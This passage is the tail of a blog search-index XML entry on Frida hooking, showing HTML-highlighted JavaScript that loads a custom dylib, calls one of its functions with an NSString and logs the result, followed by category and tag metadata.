funcPointer = getFuncPointer(<span class="hljs-string">&quot;/private/var/tmp/libtools.dylib&quot;</span>,<span class="hljs-string">&quot;custom&quot;</span>,<span class="hljs-string">&quot;pointer&quot;</span>,[<span class="hljs-string">&quot;pointer&quot;</span>]);<br>    <span class="hljs-keyword">var</span> newStrObject = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;hello~~~~&quot;</span>);<br>    <span class="hljs-keyword">var</span> pointerRet = funcPointer(newStrObject);<br>    <span class="hljs-keyword">var</span> objectRet = <span class="hljs-keyword">new</span> ObjC.Object(pointerRet);<br>    <span class="hljs-built_in">console</span>.log(objectRet);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>frida</tag>
      
      <tag>hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
